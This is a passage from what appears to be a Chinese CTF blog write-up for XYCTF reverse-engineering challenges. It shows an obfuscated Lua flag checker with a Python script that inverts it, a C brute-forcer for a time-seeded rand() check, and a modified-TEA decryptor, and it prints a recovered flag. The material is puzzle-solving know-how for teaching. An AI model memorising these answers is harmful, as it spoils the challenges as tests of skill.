operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> i<span class="token punctuation">)</span>  temp <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>char<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">Xor</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">)</span>  value <span class="token operator">=</span> value <span class="token operator">..</span> temp  i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>len<span class="token punctuation">)</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">&lt;</span> i <span class="token keyword">then</span>    <span class="token keyword">break</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">do</span>  <span class="token keyword">for</span> _ <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1000</span> <span class="token keyword">do</span>    x <span class="token operator">=</span> <span class="token number">3</span>    y <span class="token operator">=</span> x <span class="token operator">*</span> <span class="token number">3</span>    z <span class="token operator">=</span> y <span class="token operator">/</span> <span class="token number">4</span>    w <span class="token operator">=</span> z <span class="token operator">-</span> <span class="token number">5</span>    <span class="token keyword">if</span> w <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">then</span>      <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"This line will never be executed"</span><span class="token punctuation">)</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token keyword">for</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>len<span class="token punctuation">)</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">do</span>    temp <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> i<span class="token punctuation">)</span>    temp <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>char<span class="token punctuation">)</span><span class="token punctuation">(</span>temp <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span>    output <span class="token operator">=</span> output <span class="token operator">..</span> temp  <span class="token keyword">end</span>  result <span class="token operator">=</span> output<span class="token punctuation">:</span><span class="token function">rep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>  invalid_list <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> _ <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span> <span class="token keyword">do</span>    <span class="token punctuation">(</span>table<span class="token punctuation">.</span>insert<span class="token punctuation">)</span><span class="token punctuation">(</span>invalid_list<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>  <span class="token keyword">end</span>  <span class="token keyword">for</span> _ <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span> <span class="token keyword">do</span>    result <span class="token operator">=</span> result <span class="token operator">..</span> <span class="token string">"A"</span>    <span class="token punctuation">;</span>    <span class="token punctuation">(</span>table<span class="token punctuation">.</span>insert<span class="token punctuation">)</span><span class="token punctuation">(</span>invalid_list<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>  <span class="token keyword">end</span>  <span class="token keyword">for</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>len<span class="token punctuation">)</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span> <span class="token keyword">do</span>    temp <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> i<span class="token punctuation">)</span>    temp <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>char<span class="token punctuation">)</span><span class="token punctuation">(</span>temp <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token keyword">end</span>  <span class="token keyword">for</span> _ <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span> <span class="token keyword">do</span>    result <span class="token operator">=</span> result <span class="token operator">..</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>lower<span class="token punctuation">)</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>  <span class="token keyword">end</span>  <span class="token keyword">for</span> _ <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">950</span> <span class="token keyword">do</span>    x <span class="token operator">=</span> <span class="token number">3</span>    y <span class="token operator">=</span> x <span class="token operator">*</span> <span class="token number">3</span>    z <span class="token operator">=</span> y <span class="token operator">/</span> <span class="token number">4</span>    w <span class="token operator">=</span> z <span class="token operator">-</span> <span class="token number">5</span>    <span class="token keyword">if</span> w <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">then</span>      <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"This line will never be executed"</span><span class="token punctuation">)</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token keyword">for</span> _ <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span> <span class="token keyword">do</span>    x <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>    y <span class="token operator">=</span> x <span class="token operator">*</span> <span class="token number">4</span>    z <span class="token operator">=</span> y <span class="token operator">/</span> <span class="token number">2</span>    w <span class="token operator">=</span> z <span class="token operator">-</span> <span class="token number">3</span>    <span class="token keyword">if</span> w <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">then</span>      <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"This line will also never be executed"</span><span class="token punctuation">)</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"base64"</span><span class="token punctuation">)</span>  obfuscated_output <span class="token operator">=</span> <span class="token function">to_base64</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>  obfuscated_output <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>reverse<span class="token punctuation">)</span><span class="token punctuation">(</span>obfuscated_output<span class="token punctuation">)</span>  obfuscated_output <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>gsub<span class="token punctuation">)</span><span class="token punctuation">(</span>obfuscated_output<span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span>  obfuscated_output <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>gsub<span class="token punctuation">)</span><span class="token punctuation">(</span>obfuscated_output<span class="token punctuation">,</span> <span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">)</span>  obfuscated_output <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>gsub<span class="token punctuation">)</span><span class="token punctuation">(</span>obfuscated_output<span class="token punctuation">,</span> <span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">)</span>  invalid_variable <span class="token operator">=</span> obfuscated_output<span class="token punctuation">:</span><span class="token function">rep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> obfuscated_output <span class="token operator">==</span> <span class="token string">"==AeuFEcwxGPuJ0PBNzbC16ctFnPB5DPzI0bwx6bu9GQ2F1XOR1U"</span> <span class="token keyword">then</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"You get the flag."</span><span class="token punctuation">)</span>  <span class="token keyword">else</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"F**k!"</span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag 每字节与8异或，然后加3,转为base64，逆置，然后进行字符替换写一个脚本逆过来即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64enc<span class="token operator">=</span><span class="token string">"==AeuFEcwxGPuJ0PBNzbC16ctFnPB5DPzI0bwx6bu9GQ2F1XOR1U"</span>newenc<span class="token operator">=</span>enc<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">,</span><span class="token string">"H"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"W"</span><span class="token punctuation">)</span>newenc<span class="token operator">=</span>newenc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>newenc<span class="token punctuation">)</span>newenc2<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>newenc<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>newenc2<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> newenc2<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment"># U1ROX1F2QG9ubWxwb0IzPD5BPnFtcW1CbzNBP0JuPGxwcEFueA==</span><span class="token comment"># b'STN_Qv@onmlpoB3&lt;>A>qmqmBo3A?Bn&lt;lppAnx'</span><span class="token comment"># XYCTF&#123;5dcbaed781363fbfb7d8647c1aee6c&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ezrand"><a class="markdownIt-Anchor" href="#ezrand"></a> ezrand</h3><p>259846</p><p>可以看出随机数的seed与时间有关，获得的随机数再与输入的flag进行一些列操作获得密文，但是rand_number是unsigned int8类型，我们可以对seed进行爆破</p><p>rand 函数在api-ms-win-crt-utility-l1-1-0 ）总是返回一个范围是 16 位的整数。 为确保爆破用的 rand 同样是来自 api-ms-win-crt-utility-l1-1-0 的</p><p>坑：这里的伪代码是有问题的，这⾥并⾮直接调⽤srand(time64(0)) ⽽是中间⽤了个 movzx ecx,ax; 实际上就是保留了低16位 即真正的随机数种⼦是time64(0)&amp;0xf</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">u8</span> <span class="token expression"><span class="token keyword">unsigned</span> <span class="token keyword">char</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">u16</span> <span class="token expression"><span class="token keyword">unsigned</span> <span class="token keyword">short</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">u32</span> <span class="token expression"><span class="token keyword">unsigned</span> <span class="token keyword">int</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">u64</span> <span class="token expression"><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span></span></span>u8 ida_chars<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span>    <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xF2</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span>    <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x4D</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> tmpl <span class="token operator">=</span> <span class="token string">"XYCTF&#123;XXXXXXXXXXXXXXXXXXXXXX&#125;"</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>u32 i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">0xFFFF</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        u32 flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token function">srand</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">29</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            u32 eax <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 16 bits</span>            u32 r8d <span class="token operator">=</span> eax<span class="token punctuation">;</span>            u64 mul <span class="token operator">=</span> <span class="token punctuation">(</span>u64<span class="token punctuation">)</span>eax <span class="token operator">*</span> <span class="token punctuation">(</span>u64<span class="token punctuation">)</span><span class="token number">0x80808081</span><span class="token punctuation">;</span>            u32 edx <span class="token operator">=</span> <span class="token punctuation">(</span>mul <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">7</span><span class="token punctuation">;</span>            u32 ecx<span class="token punctuation">;</span>            <span class="token comment">// always 0:</span>            <span class="token comment">// ecx = edx >> 31;</span>            <span class="token comment">// edx += ecx;</span>            ecx <span class="token operator">=</span> edx <span class="token operator">*</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>            r8d <span class="token operator">-=</span> ecx<span class="token punctuation">;</span>            r8d <span class="token operator">^=</span> ida_chars<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;</span> <span class="token number">6</span> <span class="token operator">||</span> j <span class="token operator">==</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>r8d <span class="token operator">!=</span> tmpl<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// or:</span>            <span class="token comment">// if (r8d &lt; 32 || r8d >= 127) &#123;</span>            <span class="token comment">//     flag = 0;</span>            <span class="token comment">//     break;</span>            <span class="token comment">// &#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Seed: %u\t"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">srand</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">29</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                u32 eax <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                u32 r8d <span class="token operator">=</span> eax<span class="token punctuation">;</span>                u64 mul <span class="token operator">=</span> <span class="token punctuation">(</span>u64<span class="token punctuation">)</span>eax <span class="token operator">*</span> <span class="token punctuation">(</span>u64<span class="token punctuation">)</span><span class="token number">0x80808081</span><span class="token punctuation">;</span>                u32 edx <span class="token operator">=</span> <span class="token punctuation">(</span>mul <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">7</span><span class="token punctuation">;</span>                u32 ecx<span class="token punctuation">;</span>                ecx <span class="token operator">=</span> edx <span class="token operator">*</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>                r8d <span class="token operator">-=</span> ecx<span class="token punctuation">;</span>                r8d <span class="token operator">^=</span> ida_chars<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> r8d<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="给阿姨倒一杯卡布奇诺"><a class="markdownIt-Anchor" href="#给阿姨倒一杯卡布奇诺"></a> 给阿姨倒一杯卡布奇诺</h3><p>魔改tea加密，稍微修改一下tea的模版即可</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">uint32_t</span> <span class="token expression"><span class="token keyword">unsigned</span> <span class="token keyword">int</span></span></span><span class="token keyword">void</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token class-name">uint32_t</span> data1 <span class="token operator">=</span> <span class="token number">0x5F797274</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token class-name">uint32_t</span> data2 <span class="token operator">=</span> <span class="token number">0x64726168</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>   <span class="token comment">// [rsp+20h] [rbp-10h]</span>    <span class="token class-name">uint32_t</span> sum<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-Ch]</span>    <span class="token class-name">uint32_t</span> v1<span class="token punctuation">;</span>  <span class="token comment">// [rsp+28h] [rbp-8h]</span>    <span class="token class-name">uint32_t</span> v0<span class="token punctuation">;</span>  <span class="token comment">// [rsp+2Ch] [rbp-4h]</span>    sum <span class="token operator">=</span> <span class="token number">0x6E75316C</span> <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">;</span>    <span class="token class-name">uint32_t</span> data1_tmp <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token class-name">uint32_t</span> data2_tmp <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v0 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">31</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v1 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> v0<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        v0 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> v1<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        sum <span class="token operator">-=</span> <span class="token number">0x6E75316C</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v0 <span class="token operator">^</span> data1<span class="token punctuation">;</span>    v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1 <span class="token operator">^</span> data2<span class="token punctuation">;</span>    data1 <span class="token operator">=</span> data1_tmp<span class="token punctuation">;</span>    data2 <span class="token operator">=</span> data2_tmp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">// [rsp+60h] [rbp-40h] BYREF</span>    <span class="token class-name">uint32_t</span> array<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+70h] [rbp-30h]</span>    array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x9B28ED45</span><span class="token punctuation">;</span>    array<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x145EC6E9</span><span class="token punctuation">;</span>    array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x5B27A6C3</span><span class="token punctuation">;</span>    array<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xE59E75D5</span><span class="token punctuation">;</span>    array<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xE82C2500</span><span class="token punctuation">;</span>    array<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xA4211D92</span><span class="token punctuation">;</span>    array<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xCD8A4B62</span><span class="token punctuation">;</span>    array<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xA668F440</span><span class="token punctuation">;</span>    key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x65766967</span><span class="token punctuation">;</span>    key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x756F795F</span><span class="token punctuation">;</span>    key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x7075635F</span><span class="token punctuation">;</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6165745F</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">decrypt</span><span class="token punctuation">(</span>array <span class="token operator">+</span> i<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>array<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 